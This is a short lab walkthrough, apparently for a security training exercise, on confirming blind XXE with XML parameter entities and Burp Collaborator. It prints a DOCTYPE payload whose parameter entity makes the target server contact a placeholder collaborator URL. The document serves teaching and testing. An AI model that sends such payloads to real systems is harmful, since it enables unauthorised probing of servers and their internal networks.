# Lab 04 – Blind XXE with Parameter Entities

## Objective

Exploit a blind XXE vulnerability where normal external entity techniques do not produce a useful response.

The lab can be solved by using **XML parameter entities** to trigger an out-of-band interaction.

---

## Vulnerability

The application processes XML and supports external entities, but the entity value is not reflected in the response.

Therefore:

```text
Normal XXE
    ↓
No useful response
```

Parameter entities provide another way to construct the XXE payload.

---

# Step 1 — Identify the XML Request

Intercept an XML request using Burp Suite.

Send the request to:

```text
Burp Repeater
```

---

# Step 2 — Generate a Collaborator Address

Open:

```text
Burp → Collaborator
```

Generate a unique interaction address.

---

# Step 3 — Define a Parameter Entity

A parameter entity is declared using `%`.

Conceptual structure:

```xml
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "YOUR-COLLABORATOR-URL">
    %xxe;
]>
```

The important difference is:

```text
Normal entity:
&entity;

Parameter entity:
%entity;
```

---

# Step 4 — Send the Request

Insert the parameter entity into the XML request and send it.

The HTTP response may contain no useful information.

---

# Step 5 — Check Collaborator

Check for:

```text
DNS interaction
HTTP interaction
```

A successful interaction demonstrates that the XML parser processed the parameter entity.

---

# Attack Flow

```text
XML Request
     ↓
DOCTYPE
     ↓
Parameter Entity
     ↓
External Resource
     ↓
Server Interaction
     ↓
Collaborator
```

---

# Why It Works

Parameter entities are processed within the DTD.

This allows an attacker to reference an external resource even when the normal entity value is not returned by the application.

---

# Key Learning

Parameter entities are an important technique for blind XXE because they provide additional control over DTD processing.